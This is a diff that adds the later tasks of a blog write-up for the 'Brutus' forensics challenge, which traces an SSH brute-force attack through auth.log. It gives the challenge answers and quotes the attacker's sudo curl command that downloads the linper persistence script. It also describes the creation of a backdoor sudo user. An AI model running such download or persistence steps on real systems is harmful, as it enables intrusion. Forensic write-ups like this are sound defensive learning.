@@ -66,18 +66,64 @@ After inputting the time I found into the prompt for the task, I get a confirmat
 
 ### Task 4
 
+The fourth task is: "SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
 
+I've seen the answer to this question before, on line 324 after the attacker logs in as root. Looking back to that I found that the SSH session number is 37.
+
+![ssh session number](/blog/posts/media/brutus-sherlock-writeup/root-success.png) 
+
+After dropping this into the prompt for the task I'm reassured that this is correct.
+
+![task 4 complete](/blog/posts/media/brutus-sherlock-writeup/task-4.png) 
 
 ### Task 5
 
+The fifth task is: "The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?"
 
+Looking through `auth.log` I found an interesting chain of events. After the root user logged in over SSH, a new group was created, and after that, a new user was created. Then the new user was added to the `sudo` group, giving the user root access. The username for that user is cyberjunkie.
+
+![new user added](/blog/posts/media/brutus-sherlock-writeup/new-user-added.png) 
+
+After inputting that username into the prompt for the task, I see this was the correct username.
+
+![task 5 complete](/blog/posts/media/brutus-sherlock-writeup/task-5.png) 
 
 ### Task 6
 
+The sixth task is: "What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new user account?"
 
+I honestly didn't know what this was, so I turned to Google for some much needed assistance. After poking around on the MITRE website and learning about how they define stuff, I found the ID T1136.001.
+
+I dropped that in the prompt for the task, and got confirmation that was correct.
+
+![task 6 complete](/blog/posts/media/brutus-sherlock-writeup/task-6.png) 
 
 ### Task 7
 
+The seventh task is: "What time did the attacker's first SSH session end according to auth.log?"
 
+This should be fairly simple to find. Diving back in to `auth.log` I'm looking for the word disconnect, so doing a simple search inside vim brings me to the exact line I'm looking for. There I see the timestamp of Mar 6 06:37:24
+
+![disconnect](/blog/posts/media/brutus-sherlock-writeup/disconnect.png) 
+
+I put the timestamp 2024-03-06 06:37:24 into the prompt for the task, and confirmed this was the correct time.
+
+![task 7 complete](/blog/posts/media/brutus-sherlock-writeup/task-7.png) 
 
 ### Task 8
+
+The eighth task is: "The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?"
+
+This last task is slightly more tricky than the other other tasks because there's one command that's thrown in there to throw you off, but the real command I'm looking for should be pretty obvious. Near the bottom of `auth.log` I see line that has `sudo` in it. Upon further inspection I see that this is the command being run: "/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh". Now, linper is a system persistence script, which makes compete sense to run on a compromised machine like this.
+
+![linper download](/blog/posts/media/brutus-sherlock-writeup/linper.png) 
+
+After dropping that command in the prompt for the task, I see that's the command we're looking for.
+
+![task 8 complete](/blog/posts/media/brutus-sherlock-writeup/task-8.png) 
+
+## The end
+
+That's the Sherlock complete! This honestly didn't take me too long to complete, a super easy challenge. Maybe the next Sherlock I do, I'll ramp up the difficulty on.
+
+Until next time
